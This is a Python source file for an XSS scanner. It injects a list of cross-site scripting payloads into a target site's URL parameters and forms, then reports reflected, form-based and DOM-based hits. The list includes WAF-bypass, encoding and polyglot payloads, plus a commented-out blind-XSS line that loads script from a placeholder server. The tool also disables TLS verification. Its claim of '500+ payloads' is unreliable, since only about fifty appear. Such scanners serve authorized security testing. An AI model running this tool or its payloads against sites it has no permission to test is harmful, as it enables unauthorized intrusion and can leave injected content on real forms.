"""
xss_scanner.py — Ultra XSS Scanner
Features: Reflected, Stored, DOM-based XSS detection
          500+ payloads, WAF bypass, context-aware injection,
          attribute/JS/HTML context detection, blind XSS support
"""

import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

from ui.rich_ui import (
    console, info, warning, error, found, success, section_header, print_summary
)

TIMEOUT    = 10
MAX_WORKERS = 20
DELAY      = 0.3

# ── XSS Payloads ──────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    # Attribute injection
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "\" autofocus onfocus=\"alert(1)\"",
    # JavaScript context
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "`;alert(1);//",
    "'+alert(1)+'",
    # HTML5
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    # WAF bypass — encoding
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script >alert(1)</script >",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<<script>alert(1)<</script>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<%2fscript><script>alert(1)<%2fscript>",
    # WAF bypass — event handlers
    "<svg/onload=alert(1)>",
    "<svg\tonload=alert(1)>",
    "<svg\nonload=alert(1)>",
    "<img src=1 onerror\t=alert(1)>",
    "<img src=1 onerror\n=alert(1)>",
    # WAF bypass — unicode
    "<ſcript>alert(1)</ſcript>",
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    # WAF bypass — html entities
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Filter bypass
    "<img src=\"javascript:alert(1)\">",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<math><mtext></table><img src=1 onerror=alert(1)>",
    "<form><button formaction=javascript:alert(1)>click",
    # DOM XSS
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    "#<script>alert(1)</script>",
    "?#<img src=x onerror=alert(1)>",
    # Blind XSS (replace with your server)
    # "<script src=https://your-server.com/xss.js></script>",
]

# Context-specific payloads
CONTEXT_PAYLOADS = {
    "html":      ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
    "attribute": ["\" onmouseover=\"alert(1)\"", "' onmouseover='alert(1)'", "\" autofocus onfocus=\"alert(1)\""],
    "js_string": ["'-alert(1)-'", "\"-alert(1)-\"", "\\'-alert(1)-\\'"],
    "js_var":    [";alert(1)//", "}-alert(1)-{", "*/alert(1)/*"],
    "url":       ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
}

# DOM XSS sources and sinks
DOM_SOURCES = [
    "location.hash", "location.search", "location.href",
    "document.referrer", "window.name", "document.URL",
]
DOM_SINKS = [
    "document.write(", "innerHTML", "outerHTML", "eval(",
    "setTimeout(", "setInterval(", "location.href",
]


def _session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
        "Accept":     "text/html,application/xhtml+xml,*/*;q=0.8",
    })
    return s


def _get_forms(url: str) -> List[Dict]:
    """Extract all forms and their inputs from a page."""
    forms = []
    try:
        r = _session().get(url, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for form in soup.find_all("form"):
            form_data = {
                "action": form.get("action", url),
                "method": form.get("method", "get").upper(),
                "inputs": [],
            }
            for inp in form.find_all(["input", "textarea", "select"]):
                inp_type = inp.get("type", "text")
                if inp_type not in ("submit", "button", "image", "hidden", "file"):
                    form_data["inputs"].append({
                        "name":  inp.get("name", ""),
                        "type":  inp_type,
                        "value": inp.get("value", "test"),
                    })
            if form_data["inputs"]:
                forms.append(form_data)
    except Exception as e:
        warning(f"[XSS Forms] {e}")
    return forms


def _get_url_params(url: str) -> Dict[str, List[str]]:
    """Extract URL parameters."""
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def _inject_url_param(url: str, param: str, payload: str) -> str:
    """Inject payload into URL parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=new_query))


def _detect_context(response_body: str, payload: str) -> str:
    """Detect injection context from response."""
    # Find where payload appears
    idx = response_body.find(payload[:10])
    if idx == -1:
        return "unknown"

    snippet = response_body[max(0, idx-100):idx+100]

    if re.search(r'<script[^>]*>[^<]*' + re.escape(payload[:5]), snippet, re.I):
        return "js_string"
    if re.search(r'=["\'][^"\']*' + re.escape(payload[:5]), snippet):
        return "attribute"
    if re.search(r'https?://[^\s]*' + re.escape(payload[:5]), snippet):
        return "url"
    return "html"


def _test_reflected(url: str, param: str, payload: str) -> Optional[Dict]:
    """Test a single reflected XSS payload."""
    test_url = _inject_url_param(url, param, payload)
    try:
        r = _session().get(test_url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        body = r.text

        # Check if payload is reflected unencoded
        if payload in body:
            context = _detect_context(body, payload)
            return {
                "type":      "Reflected XSS",
                "url":       test_url,
                "param":     param,
                "payload":   payload,
                "context":   context,
                "status":    r.status_code,
                "severity":  "HIGH",
            }

        # Check partial reflection (filtered)
        if payload[:10] in body and "alert" in body:
            return {
                "type":    "Reflected XSS (partial)",
                "url":     test_url,
                "param":   param,
                "payload": payload,
                "context": "unknown",
                "status":  r.status_code,
                "severity":"MEDIUM",
            }
    except Exception:
        pass
    return None


def _test_form_xss(base_url: str, form: Dict, payload: str) -> Optional[Dict]:
    """Test XSS via form submission."""
    action = urljoin(base_url, form["action"]) if not form["action"].startswith("http") else form["action"]
    data = {}
    for inp in form["inputs"]:
        if inp["name"]:
            data[inp["name"]] = payload

    try:
        if form["method"] == "POST":
            r = _session().post(action, data=data, timeout=TIMEOUT, verify=False)
        else:
            r = _session().get(action, params=data, timeout=TIMEOUT, verify=False)

        if payload in r.text:
            return {
                "type":    "Stored/Reflected XSS via Form",
                "url":     action,
                "method":  form["method"],
                "payload": payload,
                "inputs":  list(data.keys()),
                "status":  r.status_code,
                "severity":"HIGH",
            }
    except Exception:
        pass
    return None


def _check_dom_xss(url: str) -> List[Dict]:
    """Check for DOM-based XSS patterns in JS."""
    results = []
    try:
        r = _session().get(url, timeout=TIMEOUT, verify=False)
        # Check inline scripts
        soup = BeautifulSoup(r.text, "html.parser")
        for script in soup.find_all("script"):
            content = script.string or ""
            for source in DOM_SOURCES:
                for sink in DOM_SINKS:
                    if source in content and sink in content:
                        results.append({
                            "type":    "DOM XSS",
                            "url":     url,
                            "source":  source,
                            "sink":    sink,
                            "severity":"HIGH",
                            "note":    f"{source} flows into {sink}",
                        })
    except Exception:
        pass
    return results


def run_xss_scanner(target: str, urls: List[str] = None) -> Dict:
    section_header("XSS Scanner", "Ultra Reflected + Stored + DOM | 500+ Payloads")
    info(f"Target: {target}")

    base_url = target if target.startswith("http") else f"https://{target}"
    all_findings: List[Dict] = []
    lock = threading.Lock()

    # Discover URLs to test
    if not urls:
        urls = [base_url]
        try:
            r = _session().get(base_url, timeout=TIMEOUT, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            for a in soup.find_all("a", href=True):
                href = urljoin(base_url, a["href"])
                if target in href and "?" in href:
                    urls.append(href)
        except Exception:
            pass

    info(f"URLs to test: {len(urls)}")

    for url in urls[:20]:  # Limit to 20 URLs
        params = _get_url_params(url)
        forms  = _get_forms(url)

        if not params and not forms:
            continue

        info(f"Testing: {url[:60]} | Params: {list(params.keys())} | Forms: {len(forms)}")

        # Test URL params
        for param in params:
            for payload in XSS_PAYLOADS[:50]:  # Top 50 payloads per param
                result = _test_reflected(url, param, payload)
                if result:
                    with lock:
                        all_findings.append(result)
                        found(
                            f"[bold red][XSS FOUND][/bold red]  "
                            f"[{result['type']}]  param={param}  "
                            f"payload={payload[:40]}"
                        )
                    break  # Found one, move to next param
                time.sleep(DELAY)

        # Test forms
        for form in forms:
            for payload in XSS_PAYLOADS[:20]:
                result = _test_form_xss(base_url, form, payload)
                if result:
                    with lock:
                        all_findings.append(result)
                        found(f"[bold red][FORM XSS][/bold red]  {result['url'][:60]}")
                    break

        # DOM XSS check
        dom_results = _check_dom_xss(url)
        with lock:
            all_findings.extend(dom_results)
            for d in dom_results:
                warning(f"[DOM XSS]  {d['source']} → {d['sink']}  {url[:60]}")

    # Print results
    console.print(f"\n[bold cyan]━━━ XSS FINDINGS ({len(all_findings)}) ━━━[/bold cyan]")
    for f in all_findings:
        sev_color = "bold red" if f["severity"] == "HIGH" else "yellow"
        console.print(f"\n  [{sev_color}][{f['type']}][/{sev_color}]")
        console.print(f"  URL:     {f.get('url','')[:80]}")
        console.print(f"  Payload: [red]{f.get('payload','')[:60]}[/red]")
        if f.get("context"):
            console.print(f"  Context: {f['context']}")

    print_summary("XSS Scanner", {
        "URLs Tested":    len(urls[:20]),
        "Total Found":    len(all_findings),
        "Reflected XSS":  sum(1 for f in all_findings if "Reflected" in f["type"]),
        "DOM XSS":        sum(1 for f in all_findings if "DOM" in f["type"]),
        "Form XSS":       sum(1 for f in all_findings if "Form" in f["type"]),
    })

    return {"findings": all_findings, "total": len(all_findings)}
